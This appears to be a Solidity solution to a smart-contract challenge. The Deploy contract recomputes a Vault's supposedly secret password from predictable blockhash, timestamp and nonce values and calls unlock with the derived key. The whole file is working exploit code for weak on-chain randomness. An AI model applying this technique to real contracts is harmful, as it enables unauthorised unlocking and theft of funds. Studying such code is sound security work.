pragma solidity ^0.8.13;

import {Vault} from "./Vault.sol";

contract Deploy {
    Vault target;
    uint256 nonce;

    constructor(address _target) {
        target = Vault(_target);
    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes32 passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
//00000000 00000000 00000000 00000000        00000000 00000000 00000000 00000000
//00000000 00000000 00000000 00000000        00000000 00000000 00000000 00000000
    function generateUnlockKey(address vaultOwner) public  {
        uint64 ownerPart = uint64(uint160(vaultOwner));
        uint64 secretPart = uint64(_magicPassword());
        bytes16 key = bytes16((uint128(ownerPart) << 64) | secretPart);
        target.unlock(key);
    }
}
